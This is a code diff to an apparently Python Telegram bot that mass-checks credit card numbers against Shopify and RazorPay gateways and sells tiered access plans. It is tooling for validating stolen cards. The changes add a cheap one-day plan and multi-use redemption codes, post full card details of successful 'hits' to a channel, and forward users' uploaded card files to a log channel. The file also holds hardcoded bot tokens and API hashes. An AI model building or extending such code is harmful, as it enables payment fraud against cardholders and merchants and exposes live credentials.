@@ -13,7 +13,6 @@ import json
 import re
 import string
 import logging
-import io
 import socket
 import platform
 from datetime import datetime, timedelta
@@ -103,7 +102,7 @@ API_ID = int(os.getenv("API_ID", "33552520"))
 API_HASH = os.getenv("API_HASH", "d82affa92dd5a1dbaa3087aa19a732f2")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8833740041:AAH_UTNyAczsiGvm-qTi3NOJDJcPr2LCTCw")
 ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[7132150988]"))
-HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004416713458"))
+HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004431317848"))
 JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "-1003837703405"))
 JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "-1003837703405"))
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/meowmeow7070")
@@ -145,12 +144,13 @@ FREE_SP_COOLDOWN = 10
 # Updated PLANS with Trial
 PLANS = {
     "trial": {"name": bs("Trial Access"), "tier": "Trial", "duration_days": 3, "emoji": "🎁", "price": "$5.00"},
+    "1day": {"name": bs("1 Day Access"), "tier": "1Day", "duration_days": 1, "emoji": "⚡", "price": "$1.00"},
     "plan1": {"name": bs("Core Access"), "tier": "Core", "duration_days": 7, "emoji": "🛠️", "price": "$8.00"},
     "plan2": {"name": bs("Elite Access"), "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
     "plan3": {"name": bs("Root Access"), "tier": "Root", "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
     "plan4": {"name": bs("X-Access"), "tier": "X", "duration_days": 90, "emoji": "💎", "price": "$60.00"},
 }
-PAID_TIERS = ["Trial", "Core", "Elite", "Root", "X"]
+PAID_TIERS = ["Trial", "1Day", "Core", "Elite", "Root", "X"]
 
 # ── PER-USER Semaphore Factory (FULLY SEPARATED per function) ──
 _USER_SEMS = {}
@@ -876,7 +876,7 @@ def get_cc_limit(plan, uid=None):
     if p == "Root": return 10000
     if p == "Elite": return 5000
     if p == "Core": return 2500
-    if p == "Trial": return 2000
+    if p in ("Trial", "1Day"): return 2000
     return 0
 
 
@@ -1364,7 +1364,7 @@ async def _build_status_text():
 
 
 # ====================== CLIENT ======================
-client = TelegramClient('𝐘ChkBoT', API_ID, API_HASH)
+client = TelegramClient('MeowChkBoT', API_ID, API_HASH)
 client_instance = client
 
 
@@ -1381,82 +1381,23 @@ async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
             msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
 <b>{bs('Gateway')} ➛ {gw}</b>
 <b>{bs('Response')} ➛ {resp}</b>
-<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> (<code>{uid}</code>) ({tag})"""
+<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"""
         else:
+            site = res.get('site', '-')
+            card_str = res.get('card', '-')
             msg = f"""<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}
 <b>{bs('Gateway')} ➛ {gw}</b>
 <b>{bs('Response')} ➛ {resp}</b>
 <b>{bs('Price')} ➛ {res.get('Price', '-')}</b>
-<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> (<code>{uid}</code>) ({tag})"""
+<b>{bs('User')} ➛ <a href="{prof}">{name}</a></b> ({tag})
+<b>{bs('User ID')} ➛ <code>{uid}</code></b>
+<b>{bs('Site')} ➛ <code>{site}</code></b>
+<b>{bs('Card')} ➛ <code>{card_str}</code></b>"""
+
         await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
     except:
         pass
 
-# ====================== CHANNEL LOG HELPERS ======================
-async def log_uploaded_file_to_channel(event, rm, uid, username, gateway="Shopify"):
-    """Forward user's uploaded card file to LOG_CHANNEL_ID with context"""
-    if not rm or not rm.document:
-        return
-    try:
-        fp = await rm.download_media()
-    except:
-        return
-    try:
-        content = None
-        try:
-            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
-                content = await f.read()
-        except:
-            pass
-        try:
-            doc_name = rm.document.attributes[0].file_name if rm.document.attributes else f"cards_{uid}.txt"
-        except:
-            doc_name = f"cards_{uid}.txt"
-        cards_preview = extract_cc(content) if content else []
-        log_cap = f"""📂 <b>{bs('File Uploaded')}</b>
-<b>━━━━━━━━━━━━━━━━━</b>
-👤 <b>{bs('User')}:</b> <a href='tg://user?id={uid}'>{username}</a> (<code>{uid}</code>)
-📄 <b>{bs('File')}:</b> <code>{doc_name}</code>
-🎴 <b>{bs('Cards')}:</b> <code>{len(cards_preview)}</code> {bs('found')}
-🏷 <b>{bs('Gateway')}:</b> <b>{gateway}</b>"""
-        try:
-            with open(fp, 'rb') as f:
-                await client_instance.send_file(
-                    LOG_CHANNEL_ID,
-                    f,
-                    caption=log_cap,
-                    parse_mode='html'
-                )
-        except:
-            try:
-                await client_instance.forward_messages(LOG_CHANNEL_ID, event.reply_to_msg_id, event.chat_id)
-            except:
-                pass
-    except Exception as e:
-        log.error(f"log_uploaded_file_to_channel: {e}")
-    finally:
-        try:
-            os.remove(fp)
-        except:
-            pass
-
-
-async def log_proxies_to_channel(uid, username, live_proxies, total_parsed):
-    """Send only a txt file (no individual messages) to LOG_CHANNEL_ID"""
-    if not live_proxies:
-        return
-    try:
-        txt_content = "\n".join(p['proxy_url'] for p in live_proxies)
-        txt_file = io.BytesIO(txt_content.encode('utf-8'))
-        txt_file.name = f"live_proxies_{uid}_{int(time.time())}.txt"
-        await client_instance.send_file(
-            LOG_CHANNEL_ID,
-            txt_file,
-            caption=f"📦 <b>{bs('Live Proxies')}</b> ━ {len(live_proxies)}/{total_parsed}\n👤 <a href='tg://user?id={uid}'>{username}</a> (<code>{uid}</code>)\n📡 <b>{bs('Total')}:</b> {len(live_proxies)}",
-            parse_mode='html'
-        )
-    except:
-        pass
 
 async def pin_charged_message(event, msg):
     try:
@@ -1856,6 +1797,7 @@ async def add_proxy_cmd(event):
     if await check_maintenance(event): return
     if not await force_join_check(event): return
     if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+    if event.sender_id not in ADMIN_ID: return await styled_reply(event, f"{PE} <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
     if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
     plan = await get_user_plan(event.sender_id)
     if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
@@ -1887,18 +1829,13 @@ async def add_proxy_cmd(event):
         if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
         parsed = parsed[:100-cc]
         tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
-        added, failed, live_proxies = [], [], []
+        added, failed = [], []
         for i in range(0, len(parsed), 10):
             batch = parsed[i:i+10]
             results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
             for pd2, res in zip(batch, results):
-                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1); live_proxies.append(pd2)
+                if isinstance(res, tuple) and res[0]: await add_proxy_db(event.sender_id, pd2); added.append(1)
                 else: failed.append(1)
-        # ── Log live proxies to channel ──
-        if live_proxies:
-            sender = await event.get_sender()
-            uname = sender.first_name or "Unknown"
-            asyncio.create_task(log_proxies_to_channel(event.sender_id, uname, live_proxies, len(parsed)))
         await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | {bs('Total')}: {cc+len(added)}/100", emoji_ids=[CE["fire"]])
     except Exception as e:
         await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@@ -1909,6 +1846,7 @@ async def view_proxies(event):
     if await check_maintenance(event): return
     if not await force_join_check(event): return
     if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+    if event.sender_id not in ADMIN_ID: return await styled_reply(event, f"{PE} <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
     if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
     plan = await get_user_plan(event.sender_id)
     if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
@@ -1927,6 +1865,7 @@ async def remove_proxy_cmd(event):
     if await check_maintenance(event): return
     if not await force_join_check(event): return
     if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+    if event.sender_id not in ADMIN_ID: return await styled_reply(event, f"{PE} <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
     if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
     plan = await get_user_plan(event.sender_id)
     if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
@@ -1952,6 +1891,7 @@ async def check_proxies_cmd(event):
     if await check_maintenance(event): return
     if not await force_join_check(event): return
     if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+    if event.sender_id not in ADMIN_ID: return await styled_reply(event, f"{PE} <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
     if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
     plan = await get_user_plan(event.sender_id)
     if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
@@ -1979,6 +1919,27 @@ async def _check_free_limits(event, uid, plan, is_group):
     return True
 
 
+async def _get_bot_owner_proxies(event):
+    """Return the bot owner/admin proxy pool used by every checking command."""
+    proxies = []
+    seen = set()
+    for admin_id in ADMIN_ID:
+        for proxy in await get_all_user_proxies(admin_id):
+            proxy_url = proxy.get("proxy_url")
+            if proxy_url and proxy_url not in seen:
+                seen.add(proxy_url)
+                proxies.append(proxy)
+    if not proxies:
+        await styled_reply(
+            event,
+            f"{PE} <b>{bs('Bot Proxy Not Configured')}</b>\n"
+            f"{PE} <i>{bs('Bot owner must add proxies with')} <code>/addpxy</code> {bs('in private chat')}</i>",
+            emoji_ids=[CE["shield"], CE["info"]]
+        )
+        return None
+    return proxies
+
+
 def _get_card_from_event(event, reply_msg):
     card = None
     if reply_msg and reply_msg.text:
@@ -2004,7 +1965,8 @@ async def single_cc_check(event):
     try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
     except: username, name = f"user_{uid}", "User"
     sites = await get_global_sites()
-    proxies = await get_all_user_proxies(uid)
+    proxies = await _get_bot_owner_proxies(event)
+    if proxies is None: return
     if not sites: return await styled_reply(event, f"{PE} <b>{bs('No global sites!')} </b><code>/add</code> (admin)", emoji_ids=[CE["warn"]])
     rm = await event.get_reply_message() if event.reply_to_msg_id else None
     card = _get_card_from_event(event, rm)
@@ -2049,11 +2011,8 @@ async def rz_single_check(event):
     if not await _check_free_limits(event, uid, plan, is_group): return
     try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
     except: username, name = f"user_{uid}", "User"
-    proxies = await get_all_user_proxies(uid)
-    if not proxies and uid not in ADMIN_ID and not is_paid_plan(plan):
-        for aid in ADMIN_ID:
-            proxies = await get_all_user_proxies(aid)
-            if proxies: break
+    proxies = await _get_bot_owner_proxies(event)
+    if proxies is None: return
     rm = await event.get_reply_message() if event.reply_to_msg_id else None
     card = _get_card_from_event(event, rm)
     if not card: return await styled_reply(event, f"{PE} <code>/rz card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
@@ -2237,7 +2196,7 @@ async def send_full_results_file(uid, all_results, gate_name, total, charged, ap
     try:
         async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
             await f.write(f"{'='*70}\n")
-            await f.write(f"𝐘 𝙲𝚑𝚔 MASS CHECK REPORT - {gate_name}\n")
+            await f.write(f"Meow 𝙲𝚑𝚔 MASS CHECK REPORT - {gate_name}\n")
             await f.write(f"{'='*70}\n")
             await f.write(f"Total Cards: {total} | Charged: {charged} | Approved: {approved} | Declined: {declined} | Errors: {errors}\n")
             await f.write(f"{'='*70}\n\n")
@@ -2280,6 +2239,8 @@ async def mass_check_cmd(event):
         return await send_premium_only_message(event)
     cl = get_cc_limit(plan, uid)
     if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
+    proxies = await _get_bot_owner_proxies(event)
+    if proxies is None: return
     content, from_inline = "", False
     cmd_text = re.sub(r'^[/.]msp\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
     if cmd_text: content = cmd_text; from_inline = True
@@ -2290,15 +2251,26 @@ async def mass_check_cmd(event):
             fp = await rm.download_media()
             try:
                 async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
-            except: pass
-            # ── Log uploaded file to channel ──
-            try:
-                sender = await event.get_sender()
-                uname = sender.first_name or "Unknown"
-                asyncio.create_task(log_uploaded_file_to_channel(event, rm, uid, uname, "Shopify"))
-            except: pass
-            try: os.remove(fp)
-            except: pass
+                try:
+                    sender = await event.get_sender()
+                    uname = sender.first_name or "User"
+                    uusername = sender.username or f"user_{uid}"
+                    fname = getattr(rm.file, 'name', 'file.txt')
+                    cc_count = len(extract_cc(content))
+                    log_msg = f"""<b>{bs('FILE UPLOAD')}</b> {PE}
+<b>{bs('User')} ➛</b> <a href='tg://user?id={uid}'>{uname}</a> (@{uusername})
+<b>{bs('User ID')} ➛</b> <code>{uid}</code>
+<b>{bs('File')} ➛</b> <code>{fname}</code>
+<b>{bs('Gateway')} ➛</b> <code>Shopify</code>
+<b>{bs('CCs')} ➛</b> <code>{cc_count}</code>"""
+                    await styled_send(LOG_CHANNEL_ID, log_msg, file=fp, emoji_ids=[CE["star"]])
+                except: pass
+                os.remove(fp)
+            except:
+                if os.path.exists(fp):
+                    try: os.remove(fp)
+                    except: pass
+
         elif rm.text: content = rm.text
     else: return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
     sites = await get_global_sites()
@@ -2307,7 +2279,6 @@ async def mass_check_cmd(event):
     if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
     if len(cards) > cl: cards = cards[:cl]
     await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
-    proxies = await get_all_user_proxies(uid)
     rotator = SmartRotator()
     async def shopify_check(card, http_session):
         result, _ = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
@@ -2366,6 +2337,8 @@ async def mrz_mass_check_cmd(event):
         return await send_premium_only_message(event)
     cl = get_cc_limit(plan, uid)
     if uid in ACTIVE_MRZ_PROCESSES: return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
+    proxies = await _get_bot_owner_proxies(event)
+    if proxies is None: return
     content, from_inline = "", False
     cmd_text = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
     if cmd_text: content = cmd_text; from_inline = True
@@ -2384,7 +2357,6 @@ async def mrz_mass_check_cmd(event):
     if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
     if len(cards) > cl: cards = cards[:cl]
     await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
-    proxies = await get_all_user_proxies(uid)
     async def rz_check(card, http_session):
         return await check_rz_with_retry(card, proxies, uid, max_retries=3, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
     if from_inline:
@@ -2434,21 +2406,24 @@ async def gen_code_cmd(event):
         return await styled_reply(event, f"{PE} <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
     parts = event.raw_text.split()
     if len(parts) < 2:
-        return await styled_reply(event, f"{PE} <b>{bs('Usage')}:</b> <code>/gencode &lt;plan_key&gt; [count]</code>\n{bs('Keys')}: trial, plan1, plan2, plan3, plan4", emoji_ids=[CE["warn"]])
+        return await styled_reply(event, f"{PE} <b>{bs('Usage')}:</b> <code>/gencode &lt;plan_key&gt; [count] [max_uses]</code>\n{bs('Example')}: <code>/gencode 1day 1 10</code>\n{bs('Keys')}: 1day, trial, plan1, plan2, plan3, plan4", emoji_ids=[CE["warn"]])
     plan_key = parts[1].lower()
     if plan_key not in PLANS:
         return await styled_reply(event, f"{PE} <b>{bs('Invalid plan')}</b>", emoji_ids=[CE["cross"]])
-    count = 1
-    if len(parts) >= 3:
-        try: count = int(parts[2])
-        except: pass
-    if count < 1 or count > 50:
-        count = 1
-    codes = await generate_plan_code(plan_key, count)
+    try:
+        count = int(parts[2]) if len(parts) >= 3 else 1
+        max_uses = int(parts[3]) if len(parts) >= 4 else 1
+    except (TypeError, ValueError):
+        return await styled_reply(event, f"{PE} <b>{bs('Count and limit must be numbers')}</b>", emoji_ids=[CE["cross"]])
+    if not 1 <= count <= 50:
+        return await styled_reply(event, f"{PE} <b>{bs('Count must be between 1 and 50')}</b>", emoji_ids=[CE["cross"]])
+    if not 1 <= max_uses <= 1000:
+        return await styled_reply(event, f"{PE} <b>{bs('Limit must be between 1 and 1000')}</b>", emoji_ids=[CE["cross"]])
+    codes = await generate_plan_code(plan_key, count, max_uses)
     if not codes:
         return await styled_reply(event, f"{PE} <b>{bs('Failed')}</b>", emoji_ids=[CE["cross"]])
     plan_info = PLANS[plan_key]
-    msg = f"{plan_info['emoji']} <b>{bs('Generated')} {len(codes)} {bs('codes for')} {plan_info['name']}</b> {plan_info['emoji']}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Plan')}:</b> {plan_info['emoji']} <b>{plan_info['name']}</b> ━ <b>{plan_info['duration_days']}{bs('d')}</b>\n{PE} <b>{bs('Codes')}:</b>\n"
+    msg = f"{plan_info['emoji']} <b>{bs('Generated')} {len(codes)} {bs('codes for')} {plan_info['name']}</b> {plan_info['emoji']}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>{bs('Plan')}:</b> {plan_info['emoji']} <b>{plan_info['name']}</b> ━ <b>{plan_info['duration_days']}{bs('d')}</b>\n{PE} <b>{bs('Code Limit')}:</b> <code>{max_uses} {bs('uses')}</code>\n{PE} <b>{bs('Codes')}:</b>\n"
     eid = [CE["fire"], CE["fire"], CE["crown"], CE["gift"]]
     for c in codes:
         msg += f"{PE} <code>{c}</code>\n"
@@ -2480,7 +2455,8 @@ async def redeem_cmd(event):
     else:
         errors = {
             "invalid": "❌ <b>{bs('Invalid code')}</b>",
-            "used": "❌ <b>{bs('Code already used')}</b>",
+            "used": "❌ <b>{bs('Code limit reached')}</b>",
+            "already_used": "❌ <b>{bs('You already used this code')}</b>",
             "has_plan": "❌ <b>{bs('You already have an active plan')}</b>",
         }
         await styled_reply(event, errors.get(reason, f"❌ <b>{bs('Error')}</b>"), emoji_ids=[CE["cross"]])
@@ -2553,7 +2529,16 @@ async def code_usage_cmd(event):
         info = get_code_info(code)
         if not info:
             return await styled_reply(event, f"{PE} <b>{bs('Code not found')}</b>", emoji_ids=[CE["cross"]])
-        if info.get("used", False):
+        try:
+            max_uses = max(1, int(info.get("max_uses", 1) or 1))
+        except (TypeError, ValueError):
+            max_uses = 1
+        try:
+            used_count = int(info.get("used_count", 1 if info.get("used", False) else 0) or 0)
+        except (TypeError, ValueError):
+            used_count = 1 if info.get("used", False) else 0
+        usage = f"{used_count}/{max_uses}"
+        if info.get("used_count", 0) or info.get("used", False):
             user_id = info.get("used_by", "?")
             used_at = info.get("used_at", "?")
             try:
@@ -2562,9 +2547,9 @@ async def code_usage_cmd(event):
                 mention = f"<a href='tg://user?id={user_id}'>{name}</a>"
             except:
                 mention = f"<code>{user_id}</code>"
-            msg = f"{PE} <b>{bs('Code')}</b> <code>{code}</code> {bs('was used by')} {mention} {bs('on')} <code>{used_at}</code>"
+            msg = f"{PE} <b>{bs('Code')}</b> <code>{code}</code> ━ <b>{bs('Usage')}:</b> <code>{usage}</code>\n{PE} {bs('Last used by')} {mention} {bs('on')} <code>{used_at}</code>"
         else:
-            msg = f"{PE} <b>{bs('Code')}</b> <code>{code}</code> {bs('has not been used yet')}"
+            msg = f"{PE} <b>{bs('Code')}</b> <code>{code}</code> ━ <b>{bs('Usage')}:</b> <code>{usage}</code>\n{PE} <b>{bs('Available')}</b>"
         await styled_reply(event, msg, emoji_ids=[CE["info"]])
 
 
